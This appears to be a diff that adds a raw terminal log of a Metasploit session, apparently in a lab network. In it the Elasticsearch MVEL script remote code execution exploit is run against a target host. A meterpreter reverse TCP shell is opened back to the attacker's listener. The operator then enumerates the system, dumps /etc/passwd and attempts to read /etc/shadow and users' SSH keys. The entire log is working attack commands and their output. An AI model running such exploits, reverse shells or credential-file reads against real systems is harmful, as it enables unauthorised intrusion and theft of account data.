@@ -1,0 +1,90 @@
+spawn msfconsole -q -x use exploit/multi/elasticsearch/script_mvel_rce; set rhosts 192.168.52.60; exploit;
+[0m[1m[34m[*][0m No payload configured, defaulting to java/meterpreter/reverse_tcp
+[0mrhosts => 192.168.52.60
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.53.28:4444 
+[1m[34m[*][0m Trying to execute arbitrary Java...
+[1m[34m[*][0m Discovering remote OS...
+[1m[32m[+][0m Remote OS is 'Linux'
+[1m[34m[*][0m Sending stage (58829 bytes) to 192.168.52.60
+[0m[1m[32m[+][0m Deleted /tmp/DVVSj.jar
+[1m[34m[*][0m Meterpreter session 1 opened (192.168.53.28:4444 -> 192.168.52.60:47302) at 2023-06-04 23:24:11 +0200
+
+[0m[?1034h[4mmeterpreter[0m > shell
+[0mProcess 1 created.
+Channel 1 created.
+whoami
+elasticsearch
+net user
+/bin/sh: 2: net: not found
+net user /domain
+/bin/sh: 3: net: not found
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+ls /home
+ash
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+bdup:x:4242:4242:,,,:/home/bdup:/bin/bash
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+ash:x:1000:1000:Ash Ketchum,,,:/home/ash:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+elasticsearch:x:106:112::/usr/share/elasticsearch:/bin/false
+postgres:x:107:114:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+cat /etc/shadow
+cat: /etc/shadow: Permission denied
+sudo cat /home/*/.ssh/id_rsa.pub
+cat: '/home/*/.ssh/id_rsa.pub': No such file or directory
+exit
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 192.168.52.60 - Meterpreter session 1 closed.  Reason: Died
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> exit -y
+[0m
